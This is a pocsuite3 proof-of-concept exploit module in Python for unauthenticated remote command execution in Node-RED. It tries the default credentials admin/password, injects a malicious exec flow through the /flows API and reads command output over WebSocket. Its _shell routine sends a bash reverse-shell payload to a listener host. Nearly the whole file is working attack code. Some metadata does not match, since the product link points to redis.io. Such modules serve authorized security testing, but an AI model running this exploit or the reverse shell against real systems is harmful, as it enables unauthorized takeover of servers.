"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
import asyncio
import json
import re

import websockets

from pocsuite3.api import POCBase, Output, register_poc, logger, requests, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = '97536'
    version = '3'
    author = ['seebug']
    vulDate = '2015-10-26'
    createDate = '2015-10-26'
    updateDate = '2015-12-09'
    references = ['https://www.seebug.org/vuldb/ssvid-97536']
    name = 'Node-RED 未授权远程命令执行'
    appPowerLink = 'http://redis.io/'
    appName = 'Node-RED'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''
        默认情况下，Node-RED 应用程序不会强制执行任何类型的身份验证，因此可以未授权公开访问，攻击
        者通过组合特定的 Flows 可以在目标系统上执行任意命令。此外，未授权滥用其他 Node还可实现
        SSRF、本地文件包含、信息泄漏等攻击。
        '''
    samples = ['']
    install_requires = ['websockets']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}

        username = 'admin'
        password = 'password'
        command = 'id'
        pattern = r'uid|gid|groups'
        try:
            output = start(self.url, command, username, password)
            if output and re.search(pattern, output, re.I):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Username'] = username
                result['VerifyInfo']['Password'] = password
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_attack(result)

    def _attack(self):
        self._verify()

    def _shell(self):
        username = 'admin'
        password = 'password'
        command = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
        try:
            start(self.url, command, username, password, shell=True)
        except Exception as ex:
            logger.error(str(ex))

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


FLOW_NAME = random_str(5)
INJECT_BLOCK_NAME = random_str(5)
EXEC_BLOCK_NAME = random_str(5)
DEBUG_BLOCK_NAME = random_str(5)

EXEC_FLOW = [
    {
        "id": FLOW_NAME,
        "type": "tab",
        "label": FLOW_NAME,
        "disabled": False,
        "info": ""
    },
    {
        "id": INJECT_BLOCK_NAME,
        "type": "inject",
        "z": FLOW_NAME,
        "name": "",
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "repeat": "",
        "crontab": "",
        "once": False,
        "onceDelay": 0.1,
        "x": 214,
        "y": 307,
        "wires": [
            [
                EXEC_BLOCK_NAME
            ]
        ]
    },
    {
        "id": EXEC_BLOCK_NAME,
        "type": "exec",
        "z": FLOW_NAME,
        "command": "",
        "addpay": False,
        "append": "",
        "useSpawn": "False",
        "timer": "",
        "oldrc": False,
        "name": "",
        "x": 411,
        "y": 318.5,
        "wires": [
            [
                DEBUG_BLOCK_NAME
            ],
            [
                DEBUG_BLOCK_NAME
            ]
        ]
    },
    {
        "id": DEBUG_BLOCK_NAME,
        "type": "debug",
        "z": FLOW_NAME,
        "name": "",
        "active": True,
        "tosidebar": True,
        "console": False,
        "tostatus": False,
        "complete": "false",
        "x": 618,
        "y": 315,
        "wires": []
    }
]


def merge_lists(list_1, list_2, key):
    merged = {}
    for item in list_1 + list_2:
        if item[key] not in merged:
            merged[item[key]] = item
    return [val for (_, val) in merged.items()]


def need_auth(url):
    response = requests.get("{}/settings".format(url))
    if response.status_code == 401:
        return 1
    return 0


def login(url, username="admin", password="password"):
    data = {
        "client_id": "node-red-editor",
        "grant_type": "password",
        "scope": "",
        "username": username,
        "password": password
    }
    response = requests.post("{}/auth/token".format(url), data=data, verify=False)
    if response.status_code == 200:
        return response.json()["access_token"]
    return None


async def exploit(url, command, shell=False, access_token=None):
    ws_url = url.replace("http", "ws")
    headers = {"Node-RED-API-Version": "v2"}

    if access_token is not None:
        headers["Authorization"] = "Bearer {}".format(access_token)

    async with websockets.connect("{}/comms".format(ws_url)) as websocket:
        if access_token is not None:
            await websocket.send(json.dumps({"auth": access_token}))
            while True:
                response = await websocket.recv()
                message = json.loads(response)
                if "auth" in message and message["auth"] == "ok":
                    print("[+] Successfully authenticated over WebSocket.")
                    break

        print("[+] Establishing RCE link ....")
        await websocket.send(json.dumps({"subscribe": "debug"}))
        current_flows = {"flows": []}
        try:
            resp = requests.get("{}/flows".format(url), headers=headers)
            if "flows" in resp.json():
                current_flows["flows"] = resp.json()["flows"]
            payload = {"flows": merge_lists(current_flows["flows"], EXEC_FLOW, "id")}
            for flow in payload["flows"]:
                if flow["id"] == EXEC_BLOCK_NAME:
                    flow["command"] = command

            resp = requests.post(
                "{}/flows".format(url),
                json=payload,
                headers=headers
            )

            resp = requests.post("{}/inject/{}".format(url, INJECT_BLOCK_NAME), headers=headers)

            output = None
            if not shell:
                while output is None:
                    response = await websocket.recv()
                    messages = json.loads(response)
                    for message in messages:
                        if "topic" in message and message["topic"] == "debug":
                            output = message["data"]["msg"].strip()
                            break

        except KeyboardInterrupt:
            payload = {"flows": []}
            for current_block in current_flows["flows"]:
                tainted = False
                for block in EXEC_FLOW:
                    if block["id"] == current_block["id"]:
                        tainted = True
                if not tainted:
                    payload["flows"].append(current_block)

            print("\n[+] Cleaning up workflows.")
            resp = requests.post(
                "{}/flows".format(url),
                json=payload,
                headers=headers
            )
            if resp.status_code == 200:
                print("[+] Done.")
            else:
                print("[!] An error occured. Manual cleanup might be required.")
        finally:
            websocket.close()
        return output


def start(url, command, username, password, shell=False):
    if need_auth(url):
        print("[+] Node-RED requires authentication.")
        if username is None and password is None:
            print("[+] Trying default credentials.")
            access_token = login(url)
        else:
            print("[+] Trying provided credentials.")
            access_token = login(url, username=username, password=password)

        if access_token is None:
            print("[!] An error occured during login procedure. Wrong creds ?")
            return
        else:
            print("[+] Successfully authenticated over HTTP.")
            return asyncio.get_event_loop().run_until_complete(exploit(url, command, shell, access_token))
    else:
        print("[+] Node-RED does not require authentication.")
        return asyncio.get_event_loop().run_until_complete(exploit(url, command, shell))


register_poc(DemoPOC)
